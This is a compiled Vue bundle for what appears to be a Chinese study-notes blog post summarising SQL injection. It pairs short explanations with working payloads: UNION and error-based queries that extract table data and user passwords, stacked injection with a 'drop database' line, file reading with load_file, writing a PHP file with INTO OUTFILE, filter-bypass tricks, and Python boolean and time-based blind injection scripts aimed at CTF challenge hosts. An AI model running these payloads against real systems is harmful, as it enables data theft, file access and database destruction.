import{Bt as e,Gn as t,Gt as n,H as r,Qn as i,Rt as a,V as o,X as s,_n as c}from"./framework.DfD1zdSt.js";import{t as l}from"./theme.DMgGaAyl.js";import"./chunks/vue-i18n.BSMUyWAh.js";import{a as u,i as d}from"./chunks/vue-router.DZdD3Cav.js";var f={__name:`sql注入总结`,setup(f,{expose:p}){let m=t(JSON.parse(`{"title":"sql注入总结","description":"","frontmatter":{"title":"sql注入总结","date":"2025-04-02 19:11:45","tags":["sql注入"],"categories":["学习笔记"]},"headers":[],"relativePath":"pages/posts/sql注入总结.md"}`)),h=u(),g=d(),_=Object.assign(g.meta.frontmatter||{},m.value?.frontmatter||{});return h.currentRoute.value.data=m.value,e(`valaxy:frontmatter`,_),globalThis.$frontmatter=_,p({frontmatter:{title:`sql注入总结`,date:`2025-04-02 19:11:45`,tags:[`sql注入`],categories:[`学习笔记`]}}),(e,t)=>{let u=l;return a(),r(u,{frontmatter:i(_)},{"main-content-md":c(()=>[...t[0]||=[o(`p`,null,`摘要：原理 sql注入发生原理： 用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库 注入类型 常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入… 基本操作 1.判断显示位 2.爆数据库的名。`,-1),o(`p`,null,`<!-- more -->`,-1),o(`h3`,{id:`原理`,tabindex:`-1`},[s(`原理 `),o(`a`,{class:`header-anchor`,href:`#原理`,"aria-label":`Permalink to "原理"`},`​`)],-1),o(`p`,null,`sql注入发生原理：`,-1),o(`p`,null,`用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库`,-1),o(`h4`,{id:`注入类型`,tabindex:`-1`},[s(`注入类型 `),o(`a`,{class:`header-anchor`,href:`#注入类型`,"aria-label":`Permalink to "注入类型"`},`​`)],-1),o(`p`,null,`常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入…`,-1),o(`h3`,{id:`基本操作`,tabindex:`-1`},[s(`基本操作 `),o(`a`,{class:`header-anchor`,href:`#基本操作`,"aria-label":`Permalink to "基本操作"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`1.判断显示位`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?id=SELECT first name, last_name FROM users WHERE user_id = '1' union select 1,2,3#;
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`2.爆数据库的名字`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?id = '1' union select 1,user(),database()--+‘；
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`3.爆数据库中的表`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?id = '-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+';
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`4.爆表中的字段`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?id= '-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+'，
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`strong`,null,`5.爆相应字段的所有数据`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?id = '-1' union select 1,2,group_concat(user,password) from users--+';
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`盲注脚本`,tabindex:`-1`},[s(`盲注脚本 `),o(`a`,{class:`header-anchor`,href:`#盲注脚本`,"aria-label":`Permalink to "盲注脚本"`},`​`)],-1),o(`h4`,{id:`布尔盲注`,tabindex:`-1`},[s(`布尔盲注 `),o(`a`,{class:`header-anchor`,href:`#布尔盲注`,"aria-label":`Permalink to "布尔盲注"`},`​`)],-1),o(`div`,{class:`language-py`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`py`),o(`pre`,null,[o(`code`,{class:`language-py`},`import requests
if __name__ == '__main__' :
    url = 'http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/'
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,0)%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,0)%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagba"),{i},1))>{mid},1,0)%23'
            payload = f'if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))>{mid},1,0)%23'
            # print(payload)
            data={
                "uname":f"admin' and {payload}#",
                "passwd":12346
            }
            r = requests.post(url=url,data=data)
            if 'flag.jpg' in r.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`时间盲注`,tabindex:`-1`},[s(`时间盲注 `),o(`a`,{class:`header-anchor`,href:`#时间盲注`,"aria-label":`Permalink to "时间盲注"`},`​`)],-1),o(`div`,{class:`language-py`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`py`),o(`pre`,null,[o(`code`,{class:`language-py`},`import requests
import time
if __name__ == '__main__' :
    url = 'http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1"%20and%20'
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,sleep(3))%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,sleep(2))%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagugs"),{i},1))>{mid},1,sleep(2))%23'
            payload = f'if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),{i},1))>{mid},1,sleep(2))%23'
            # print(payload)
            stime=time.time()
            r = requests.get(url=url + payload)
            if time.time()-stime<2:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`注入类型-1`,tabindex:`-1`},[s(`注入类型 `),o(`a`,{class:`header-anchor`,href:`#注入类型-1`,"aria-label":`Permalink to "注入类型"`},`​`)],-1),o(`h4`,{id:`二次注入`,tabindex:`-1`},[s(`二次注入 `),o(`a`,{class:`header-anchor`,href:`#二次注入`,"aria-label":`Permalink to "二次注入"`},`​`)],-1),o(`p`,null,`其产生原因是：服务器端虽然对用户的直接输入做了一些过滤或者将一些字符进行转义，但是对于已经存入数据库的信息是完全信任的，即：不校验数据库信息是否合法`,-1),o(`p`,null,`利用场景主要有：靶机里同时存在注册和登录页面，且需要获得admin密码`,-1),o(`h4`,{id:`宽字节注入`,tabindex:`-1`},[s(`宽字节注入 `),o(`a`,{class:`header-anchor`,href:`#宽字节注入`,"aria-label":`Permalink to "宽字节注入"`},`​`)],-1),o(`p`,null,`宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作`,-1),o(`p`,null,`通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。因此当我们输入’时，在php代码中如果有过滤的话会利用转义字符\\进行转义，而利用urlencode表示的话，就为%5c%27，我们若想要将%5c去掉，则若此时mysql用的是GBK编码，则可以在前面加上一个编码如**%df**，使得系统认定%df%5c表示着一个汉字。`,-1),o(`div`,{class:`language-sql`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`sql`),o(`pre`,null,[o(`code`,{class:`language-sql`},`?id=-1%df%27union select 1,2,group_concat(column_name)from information_schema.columns where table_name=%df'users %df'--+
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`堆叠注入`,tabindex:`-1`},[s(`堆叠注入 `),o(`a`,{class:`header-anchor`,href:`#堆叠注入`,"aria-label":`Permalink to "堆叠注入"`},`​`)],-1),o(`p`,null,[s(`使用前提：堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如 `),o(`strong`,null,`mysqli_multi_query()`),s(` 函数就支持多条SQL语句同时执行，而 mysqli_query() 函数就不支持。在实际应用中，大多数都使用的是 `),o(`strong`,null,`mysqli_query()`),s(` 函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用 mysqli_query() 函数。`)],-1),o(`p`,null,`利用方式:在我们输入的语句后面加上分号表示该语句结束，之后再输入另一条语句就可以了。例如可以先写一个查询语句，之后加分号表示查询结束，再在分号后输入删除语句。这样就叫堆叠注入。`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`?id=show database();drop database <数据库名>;
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`文件读取写入注入`,tabindex:`-1`},[s(`文件读取写入注入 `),o(`a`,{class:`header-anchor`,href:`#文件读取写入注入`,"aria-label":`Permalink to "文件读取写入注入"`},`​`)],-1),o(`h5`,{id:`文件读取`,tabindex:`-1`},[s(`文件读取 `),o(`a`,{class:`header-anchor`,href:`#文件读取`,"aria-label":`Permalink to "文件读取"`},`​`)],-1),o(`p`,null,[o(`code`,null,`union select 1,2,load_file('文件路径')`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`union select 1,2,load_file('D:/test.txt')
?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)
 （%20是换行，%27是引号，有路径时，防止转义可以将\\改为\\\\或者/）

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h5`,{id:`文件写入`,tabindex:`-1`},[s(`文件写入 `),o(`a`,{class:`header-anchor`,href:`#文件写入`,"aria-label":`Permalink to "文件写入"`},`​`)],-1),o(`p`,null,[o(`strong`,null,[o(`code`,null,`union select 1,'`),s(`<?php phpinfo();?>`),o(`code`,null,`',3 into outfile '文件路径' --+`)])],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`union select 1,'<?php phpinfo();?>',3 into outfile 'E:\\\\phpStudy\\\\WWW\\\\sqli\\\\Less-7\\\\1.php' --+
此时就将 phpinfo() 的内容写入 E:\\phpStudy\\WWW\\sqli\\Less-7 路径下并创建一个1.php文件

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`报错注入`,tabindex:`-1`},[s(`报错注入 `),o(`a`,{class:`header-anchor`,href:`#报错注入`,"aria-label":`Permalink to "报错注入"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`updatexml（）函数`)],-1),o(`ul`,null,[o(`li`,null,`updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。`),o(`li`,null,`作用：改变文档中符合条件的节点的值`),o(`li`,null,`语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据`),o(`li`,null,`updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）`),o(`li`,null,`例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`爆出数据库
1' and updatexml(1,concat(0x7e,database(),0x7er),1)#

爆当前数据库表信息
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #

爆user表字段信息
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1) #

爆数据库内容、、
1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`爆出数据库
1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #

爆当前数据库表信息
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #

爆user表字段信息
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) #

爆数据库内容、、
1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #

`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`handler命令注入`,tabindex:`-1`},[s(`handler命令注入 `),o(`a`,{class:`header-anchor`,href:`#handler命令注入`,"aria-label":`Permalink to "handler命令注入"`},`​`)],-1),o(`div`,{class:`language-sql`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`},`sql`),o(`pre`,null,[o(`code`,{class:`language-sql`},`HANDLER tbl_name OPEN [ [AS] alias]
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name CLOSE
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h3`,{id:`sql注入绕过`,tabindex:`-1`},[s(`SQL注入绕过 `),o(`a`,{class:`header-anchor`,href:`#sql注入绕过`,"aria-label":`Permalink to "SQL注入绕过"`},`​`)],-1),o(`h4`,{id:`_1-注释字符绕过`,tabindex:`-1`},[o(`strong`,null,`1.注释字符绕过`),s(),o(`a`,{class:`header-anchor`,href:`#_1-注释字符绕过`,"aria-label":`Permalink to "**1.注释字符绕过**"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`-- 注释内容
# 注释内容      url编码为%23
/*注释内容*/
;
/x00
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`_2-双写绕过`,tabindex:`-1`},[o(`strong`,null,`2.双写绕过`),s(),o(`a`,{class:`header-anchor`,href:`#_2-双写绕过`,"aria-label":`Permalink to "**2.双写绕过**"`},`​`)],-1),o(`p`,null,`绕过场景：代码使用replace将字符代替为空时使用`,-1),o(`p`,null,`例如，过滤了select`,-1),o(`p`,null,[s(`使用`),o(`code`,null,`selselectect =>select`)],-1),o(`h4`,{id:`_3-大写绕过`,tabindex:`-1`},[o(`strong`,null,`3.大写绕过`),s(),o(`a`,{class:`header-anchor`,href:`#_3-大写绕过`,"aria-label":`Permalink to "**3.大写绕过**"`},`​`)],-1),o(`p`,null,[s(`在正则匹配对大小写不敏感时，也就是正则匹配使用了`),o(`code`,null,`\\i`),s(`，忽略了大小写。而Mysql对大小写也不敏感时使用`)],-1),o(`p`,null,`例如，`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`/select/i

使用SeLect进行绕过
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`_4-内联注释`,tabindex:`-1`},[o(`strong`,null,`4.内联注释`),s(),o(`a`,{class:`header-anchor`,href:`#_4-内联注释`,"aria-label":`Permalink to "**4.内联注释**"`},`​`)],-1),o(`p`,null,[o(`strong`,null,`内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`/*! MySQL特有的语法 */
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[s(`例如MySQL服务器可以在以下语句中识别`),o(`code`,null,`STRAIGHT_JOIN`),s(`关键字，而其他服务器则不能：`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`/*! */类型的注释，内部语句会被执行`,-1),o(`p`,null,`一般用来绕过空格`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`select bbb from table1 where aaa='' union /*! select database()*/;
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`_5-特殊编码绕过`,tabindex:`-1`},[o(`strong`,null,`5.特殊编码绕过`),s(),o(`a`,{class:`header-anchor`,href:`#_5-特殊编码绕过`,"aria-label":`Permalink to "**5.特殊编码绕过**"`},`​`)],-1),o(`p`,null,`16进制编码绕过`,-1),o(`p`,null,`如果在查询字段名的时候表名被过滤，或者是数据库中某些特定字符被过滤，则可以使用16进制绕过。`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`select column_name from information_schema.columns where table_name=0x7573657273;
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[o(`code`,null,`0x7573657273`),s(`为users的16进制编码`)],-1),o(`h4`,{id:`_6-双重url编码绕过`,tabindex:`-1`},[o(`strong`,null,`6.双重url编码绕过`),s(),o(`a`,{class:`header-anchor`,href:`#_6-双重url编码绕过`,"aria-label":`Permalink to "**6.双重url编码绕过**"`},`​`)],-1),o(`p`,null,`对字符串进行二次url编码，可绕过关键字过滤`,-1),o(`h4`,{id:`_7-空格绕过`,tabindex:`-1`},[o(`strong`,null,`7.空格绕过`),s(),o(`a`,{class:`header-anchor`,href:`#_7-空格绕过`,"aria-label":`Permalink to "**7.空格绕过**"`},`​`)],-1),o(`p`,null,`可以使用%0d(回车)、%0a(换行)、%09(tab制表)、/**/、%a0(&nbsp）、%0b(垂直制表符)、%0c（换页符）`,-1),o(`h4`,{id:`_8-过滤了-and、or、-、-、-、regexp`,tabindex:`-1`},[s(`8.过滤了 and、or、=、>、<、regexp `),o(`a`,{class:`header-anchor`,href:`#_8-过滤了-and、or、-、-、-、regexp`,"aria-label":`Permalink to "8.过滤了 and、or、=、>、<、regexp"`},`​`)],-1),o(`p`,null,`使用 &&、||、 like、greatest(返回值的最大值)、least（返回值的最小值）`,-1),o(`h4`,{id:`_9-过滤了逗号`,tabindex:`-1`},[o(`strong`,null,`9.过滤了逗号`),s(),o(`a`,{class:`header-anchor`,href:`#_9-过滤了逗号`,"aria-label":`Permalink to "**9.过滤了逗号**"`},`​`)],-1),o(`p`,null,`limit使用from或者offset`,-1),o(`p`,null,`select substr(database(0from1for1);select mid(database(0from1for1);`,-1),o(`p`,null,`substr使用from for`,-1),o(`p`,null,`select * from news limit 0,1 <=> select * from news limit 1 offset 0`,-1),o(`p`,null,`if语句使用exp()函数代替`,-1),o(`p`,null,`exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`||exp(710-... 710-rlike 710-...)
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,[s(`即如果 `),o(`code`,null,`(... rlike ...)`),s(` 中的语句执行匹配后的结果为`),o(`code`,null,`True`),s(`，经过减号转换后为 `),o(`code`,null,`exp(710-1)`),s(` 后不会溢出；若为`),o(`code`,null,`false`),s(`，转换为 `),o(`code`,null,`exp(710-0)`),s(` 后则会溢出并报错`)],-1),o(`h4`,{id:`_10、绕过注释符号-–-过滤`,tabindex:`-1`},[o(`strong`,null,`10、绕过注释符号（#，–）过滤`),s(),o(`a`,{class:`header-anchor`,href:`#_10、绕过注释符号-–-过滤`,"aria-label":`Permalink to "**10、绕过注释符号（#，--）过滤**"`},`​`)],-1),o(`p`,null,`使用单引号、双引号进行引号闭合绕过`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`SELECT * FROM users WHERE id='$_POST[id]' LIMIT 0,1
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`我们传入`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`id=1' and 1=2 union select 1,2,3' 
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`这样语句就变成了`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`SELECT * FROM users WHERE id='1' and 1=2 union select 1,2,3' ' LIMIT 0,1
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`p`,null,`引号正常闭合`,-1),o(`h4`,{id:`_11、绕过union-select-where等`,tabindex:`-1`},[s(`11、绕过union，select，where等 `),o(`a`,{class:`header-anchor`,href:`#_11、绕过union-select-where等`,"aria-label":`Permalink to "11、绕过union，select，where等"`},`​`)],-1),o(`p`,null,`可尝试在关键字内插入/**/`,-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`U/**/NION/**/SE/**/LECT/**/user，pwd from user

union select user,pwd from user
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`_12-等价函数绕过`,tabindex:`-1`},[s(`12.等价函数绕过 `),o(`a`,{class:`header-anchor`,href:`#_12-等价函数绕过`,"aria-label":`Permalink to "12.等价函数绕过"`},`​`)],-1),o(`div`,{class:`language-`},[o(`button`,{title:`Copy code`,class:`copy`}),o(`span`,{class:`lang`}),o(`pre`,null,[o(`code`,null,`hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
`)]),o(`button`,{class:`code-block-unfold-btn`})],-1),o(`h4`,{id:`_13-information过滤`,tabindex:`-1`},[s(`13.information过滤 `),o(`a`,{class:`header-anchor`,href:`#_13-information过滤`,"aria-label":`Permalink to "13.information过滤"`},`​`)],-1),o(`p`,null,[o(`code`,null,`sys.schema_auto_increment_columns`),s(`代替`),o(`code`,null,`information_schema`),s(`，用来对表自增ID的监控`)],-1),o(`p`,null,[s(`但是 `),o(`code`,null,`sys.schema_auto_increment_columns`),s(`这个库有些局限性，一般要超级管理员才可以访问sys。`)],-1),o(`p`,null,[s(`类似可以利用的表还有：`),o(`code`,null,`mysql.innodb_table_stats`),s(`、`),o(`code`,null,`mysql.innodb_table_index`),s(`同样存放有库名表名`)],-1)]]),"main-header":c(()=>[n(e.$slots,`main-header`)]),"main-header-after":c(()=>[n(e.$slots,`main-header-after`)]),"main-nav":c(()=>[n(e.$slots,`main-nav`)]),"main-content-before":c(()=>[n(e.$slots,`main-content-before`)]),"main-content":c(()=>[n(e.$slots,`main-content`)]),"main-content-after":c(()=>[n(e.$slots,`main-content-after`)]),"main-nav-before":c(()=>[n(e.$slots,`main-nav-before`)]),"main-nav-after":c(()=>[n(e.$slots,`main-nav-after`)]),comment:c(()=>[n(e.$slots,`comment`)]),footer:c(()=>[n(e.$slots,`footer`)]),aside:c(()=>[n(e.$slots,`aside`)]),"aside-custom":c(()=>[n(e.$slots,`aside-custom`)]),default:c(()=>[n(e.$slots,`default`)]),_:3},8,[`frontmatter`])}}};export{f as default};